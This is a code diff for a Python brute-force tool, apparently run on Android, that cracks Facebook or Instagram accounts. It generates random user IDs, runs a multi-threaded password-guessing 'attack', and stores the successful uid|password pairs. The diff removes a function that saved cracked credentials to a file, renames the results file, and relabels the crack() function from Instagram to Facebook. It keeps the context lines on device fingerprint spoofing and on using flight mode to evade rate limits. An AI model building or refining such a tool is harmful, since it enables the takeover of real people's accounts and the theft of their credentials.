@@ -61,31 +61,6 @@ def generate_device_hash(uid, pw):
     hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
     return hash_obj.hexdigest()
 
-def save_success(uid, pw):
-    """Thread-safe function to save successful login"""
-    try:
-        # Try SD card path first
-        output_dir = "/sdcard/XYZ"
-        fallback_dir = "XYZ"
-        
-        try:
-            os.makedirs(output_dir, exist_ok=True)
-            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
-        except (OSError, PermissionError):
-            # Fallback to local directory
-            os.makedirs(fallback_dir, exist_ok=True)
-            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
-        
-        with open(filepath, "a", encoding='utf-8') as f:
-            f.write(f"{uid}|{pw}\n")
-        
-        # Thread-safe add to success list
-        with success_lock:
-            oks.append(uid)
-            
-    except Exception as e:
-        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")
-
 sim_id = ''
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
@@ -147,7 +122,7 @@ fbbd = device['fbbd']
 fbdm = device['fbdm']
 
 def crack(uid, password_list, total_count):
-    """Enhanced Instagram account cracking function"""
+    """Enhanced facebook account cracking function"""
     
     # Thread-safe counter increment
     with counter_lock:
@@ -325,7 +300,7 @@ def random_number():
     print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
     print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
     print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
-    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
+    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mSUMON_RANDOM_IDS.txt')
     linex()
     
     # Start multi-threaded attack
@@ -394,7 +369,7 @@ def menu():
             clear()
             print(f"\033[1;96m{'='*46}")
             print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
-            print(f"\033[1;96m{'='*56}")
+            print(f"\033[1;96m{'='*46}")
             print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
             print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
             print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
@@ -406,7 +381,7 @@ def menu():
             print(f"\033[1;92m{'='*46}")
             print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
             print(f"\033[1;92m{'='*46}")
-            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
+            print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
             print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
             time.sleep(3)
             break
